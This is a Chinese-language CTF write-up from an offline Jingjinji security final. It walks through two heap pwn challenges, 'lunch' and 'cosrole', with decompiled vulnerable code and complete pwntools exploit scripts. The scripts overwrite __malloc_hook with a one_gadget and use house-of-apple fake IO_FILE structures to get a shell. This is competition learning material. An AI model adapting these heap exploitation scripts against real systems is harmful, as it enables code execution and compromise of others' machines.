---
title: "京津冀信息安全决赛"
draft: false
pin: true
summary: "第二次打线下"
date: 2025-10-02
tags: ["pwn","ctf","awd"]
---

<!--more-->

![](http://ret2ldz.github.io/images/jjj1.png)

# lunch

本地2.23-0ubuntu3_amd64通，**远程不通**，出题人给的小众libc库根本配不了环境，而恰好我的exp又是libc强相关的(通过malloc hook附近的野生数据构造fake_fast chunk 去写 malloc_hook)，后来找隔壁做出来的兄弟请教了一下，他是通过fastbin attack打得，与libc的相关性更小。

题目漏洞如下

### 漏洞1

直接读取长度到内部数组，即使判断失败程序也不会退出。

```c
int crea()
{
  ...
    ;
  if ( *((_DWORD *)&ptr + v4[0] + 200) > 0x70u )
    return puts("Bad size.");
```

### 漏洞2

指针未置0

```c
void libera()
{
  char v0; // [rsp+Bh] [rbp-5h] BYREF
  unsigned int v1; // [rsp+Ch] [rbp-4h] BYREF

  v1 = 0;
  puts("Introduce the menu to delete");
  while ( ((unsigned int)_isoc99_scanf("%u%c", &v1, &v0) != 2 || v0 != 10) && (unsigned int)clear_stdin() )
    ;
  if ( v1 > 0x63 )
    puts("Bad position");
  else
    free((void *)ptr[v1]);
}
```

知道上面的漏洞，我们不妨释放一个堆块进入`unsorted bin`获取地址，其次再通过malloc_hook附近的fake_fast直接重写malloc_hook为oneGadget即可

```python
from pwn import *
import sys
#HOST = sys.argv[1]
#PORT = int(sys.argv[2])
#io = remote(HOST,PORT)
io = process('./lunch')
libc = ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')
context.log_level='debug'
context.arch='amd64'
#=================================
def create(idx,size):
    io.sendlineafter(b'5.- Exit\n',b'1')
    io.sendlineafter(b'Enter the position of lunch\n',str(idx).encode())
    io.sendlineafter(b'Enter the size in kcal.\n',str(size).encode())

def modify(idx,data):
    #Introduce the menu to food
    io.sendlineafter(b'5.- Exit\n',b'2')
    io.sendlineafter(b'Introduce the menu to food\n',str(idx).encode())
    io.sendafter(b'Enter the food\n',data)

def view(idx):
    io.sendlineafter(b'5.- Exit\n',b'3')
    io.sendlineafter(b'Enter the lunch to see\n',str(idx).encode())

def dele(idx):
    io.sendlineafter(b'5.- Exit\n',b'4')
    io.sendlineafter(b'Introduce the menu to delete\n',str(idx).encode())

#===================================

for i in range(0x10):
    create(i,0x30)
create(0,0x100)
modify(0,b'\x00'*0x38+p64(0x101))
dele(1)

view(1)
io.recv(0x20)
leak = u64(io.recv(8))+0x7cdd5f800000-0x7cdd5fbc3b88
log.info(hex(leak))
---------------2.23-0ubuntu10 one_gadget
one0 = 0x4526a
one1 = 0xf02a4
one2 = 0xf1147
---------------2.23-0ubuntu3_amd64 one_gadget
one = 0xf0897
fake_fast = leak + 0x7d83161c3aed - 0x7d8315e00000
realloc = leak + libc.symbols['realloc']
for i in range(0x10):
    create(i,0x60)
dele(0)
dele(2)
modify(2,p64(fake_fast))
create(0x11,0x60)
create(0x12,0x60)
modify(0x12,b'a'*0x13+p64(leak+one))
#gdb.attach(io)
create(1,0x30)

#===================================

sleep(0.5)

io.interactive()
```

![](http://ret2ldz.github.io/images/jjj2.png)

-----------------

# cosrole

### 漏洞1

逻辑判断错误，在分配函数没有标记哪个Roles有Description，请继续往下看，笔者将会娓娓道来

```c
unsigned __int64 sub_EA0()
{
  ...
    puts("need some description?(y/n)");
    read(0, buf, 2uLL);
    if ( buf[0] == 'y' )
    {
      do
      {
        do
        {
          puts("length:");
          size = getNum();
        }
        while ( size <= 0x3F );                 // ???
      }
      while ( size > 0x3E0 );
      description = malloc(size);
```

有个很有意思的函数，它会创建一个IO_FILE结构体，并把IO_list_all的值更新为它

```c
unsigned __int64 practice()
{
  int v1; // [rsp+4h] [rbp-9Ch]
  FILE *stream; // [rsp+8h] [rbp-98h]
  _BYTE buf[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v4; // [rsp+98h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( onlyone )
  {
    puts("only one");
  }
  else
  {
    puts("you can pratice:");
    stream = fopen("/dev/null", "w");
    if ( !stream )
    {
      puts("error!");
      exit(-1);
    }
    setbuf(stream, 0LL);
    v1 = read(0, buf, 0x80uLL);
    fwrite(buf, 1uLL, v1, stream);              // ???
    onlyone = 1;
    puts("ok, now you can go to real acting.");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

因此逻辑漏洞的全貌逐渐浮现。我们首先创造一个带有Description的Role，要求它的Description堆块大小与IO_FILE大小相同。其次我们释放这两个堆块，再创建一个不带Description的Role先把0x38的Chunk取出来，再用practice函数把0x230的chunk也取出来，这时候IO_list_all会指向它。最要命的是，上个Role的DescriptionPtr未置0,也就是我们以就可以访问这个可爱的IO_File

接下来就是想办法在这个0x220的空间里打house-of-apple了（Pwn手基本功奥），提示一下libc-2.27.so的_wide_vatble偏移是0x130而不是0xe0。

```python
from pwn import *
io = process('./pwn')
context.arch='amd64'
context.log_level = 'debug'
libc = ELF('./libc-2.27.so')

def create1(name,len,con):
    io.sendlineafter(b'> ',b'2')
    io.sendlineafter(b'role name:\n',name)
    io.sendlineafter(b'need some description?(y/n)\n',b'y')
    io.sendlineafter(b'length:\n',str(len).encode())
    io.sendlineafter(b'input description:\n',con)

def create2(name):
    io.sendlineafter(b'> ',b'2')
    io.sendlineafter(b'role name:\n',name)
    io.sendlineafter(b'need some description?(y/n)\n',b'n') 

def delete(idx):
    io.sendlineafter(b'> ',b'3')
    io.sendlineafter(b"delete?\n",str(idx).encode())
 
def edit(id,len,des):
    io.sendlineafter(b'> ',b'4')
    io.sendlineafter(b"role's id:\n",str(id).encode())
    io.sendlineafter(b'input new length:\n',str(len).encode())
    io.sendlineafter(b'input new description:\n',des)

def show(idx):
    io.sendlineafter(b'> ',b'1')
    io.sendlineafter(b"role's id:\n",str(idx).encode())

io.sendlineafter(b'welcome to coslay game. now, input your name:\n',b'a'*0x20)
create1(b'ldz',0x220,b'dubhe')
io.recvuntil(b'a'*0x20)
leak = u64(io.recv(6)+b'\x00'*2) - 0x7d7aee1ec760 + 0x7d7aede00000
log.info("Leak libc: "+ hex(leak)) # leak libc 

delete(0)
io.sendlineafter(b'> ',b'5') # practice
io.sendafter(b'you can pratice:',b'a')
create2(b'ldz') # fake File

show(1)
io.recv(8)
leak1 = u64(io.recv(8)) - 0x621136ffe323 + 0x621136ffe000
log.info("Heap : "+hex(leak1))

fake_heap = leak1 + 0x2a0
system_addr = leak + libc.symbols['system']
_IO_wfile_jumps = leak + libc.symbols['_IO_wfile_jumps']
io_list_all = leak + libc.symbols['_IO_list_all']

pop_rdi_ret = 0x000000000002155f+leak 
pop_rsi_ret = 0x0000000000023e6a+leak 
pop_rax_ret = 0x00000000000439c8+leak
pop_rdx_ret = 0x0000000000001b96+leak 
syscall_ret = 0x00000000000013c0+leak

fake_IO_FILE = p64(0x3b68732020) + p64(0)
fake_IO_FILE = fake_IO_FILE + 0x18*b'\x00' + p64(1)# _write_ptr
fake_IO_FILE = fake_IO_FILE.ljust(0x68,b'\x00')+p64(system_addr)
fake_IO_FILE = fake_IO_FILE.ljust(0xa0,b'\x00')+p64(fake_heap)# _wide_data
fake_IO_FILE = fake_IO_FILE.ljust(0xd8,b'\x00') +p64(_IO_wfile_jumps)# _vtable
fake_IO_FILE=fake_IO_FILE.ljust(0x130,b'\x00') + p64(fake_heap)

edit(1,0x138,fake_IO_FILE)#fake_IO_FILE) #overflow
gdb.attach(io) 

io.sendlineafter(b'> ',b'6')
#io.send(b'\x00'*0x10)
#io.shutdown()

io.interactive()

```

最后成功getshell

![](http://ret2ldz.github.io/images/jjj3.png)



### 漏洞2？

在edit函数存在overflow可以进行溢出，然后可惜的是fread几乎无法终止，所以溢出劫持`roleList[Cho] + 0x20LL`这种方式似乎行不通。

```c
v0 = *(_QWORD *)(roleList[Cho] + 48LL) + *(_QWORD *)(roleList[Cho] + 40LL);
    if ( (__int64)(*(_QWORD *)(roleList[Cho] + 48LL) + n) < v0 )// overflow
    {
      v0 = *(_QWORD *)(roleList[Cho] + 48LL);
      if ( v0 + n > v0 )
      {
        puts("input new description:");
        fread(*(void **)(roleList[Cho] + 0x30LL), 1uLL, (unsigned int)n, stdin);
        LODWORD(v0) = (*(__int64 (__fastcall **)(_QWORD))(roleList[Cho] + 0x20LL))(*(_QWORD *)(roleList[Cho] + 0x30LL));
      }
```

我在本地找到的方式是

```
io.shutdown
```

但是之后返回到main只要执行到任意Read函数就会立马挂掉。

所以也许这个漏洞的唯一利用方法是利用仅仅两次分配进行堆风水，从而上Description跑到Role堆块上方，而溢出的时候会溢出到Role Chunk本身，在`LODWORD(v0) = (*(__int64 (__fastcall **)(_QWORD))(roleList[Cho] + 0x20LL))(*(_QWORD *)(roleList[Cho] + 0x30LL));`直接getshell。



# AtLast

虽然不尽如人意，但总归是一次有意义的旅程

![](http://ret2ldz.github.io/images/jjj4.png)
